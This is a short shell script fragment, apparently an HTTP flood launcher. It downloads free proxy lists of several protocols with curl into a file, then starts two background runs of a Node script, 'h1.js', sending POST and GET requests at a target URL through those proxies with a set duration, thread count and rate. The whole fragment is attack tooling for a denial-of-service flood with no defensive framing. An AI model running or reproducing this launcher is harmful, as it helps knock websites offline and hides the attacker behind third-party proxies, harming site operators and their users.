...
for type in http https socks4 socks5; do
  curl -s "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=ipport&format=text&timeout=5000&protocol=${type}"
done > live.txt
...
node h1.js POST "$URL" live.txt "$TIME" 24 10 randomstring="true" &
node h1.js GET "$URL" live.txt "$TIME" 24 10 randomstring="true" &
